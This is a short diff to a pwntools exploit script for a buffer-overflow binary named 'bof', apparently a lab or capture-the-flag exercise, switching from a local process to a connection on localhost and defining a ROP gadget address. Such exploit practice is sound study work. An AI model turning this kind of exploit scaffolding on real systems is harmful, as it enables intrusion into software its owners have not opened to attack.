@@ -1,6 +1,7 @@
 from pwn import *
 
-r = process("./bof")
+# r = process("./bof")
+r = remote("localhost", 5011)
 pause()
 
 POP_RDI_RET = 0x4005f3
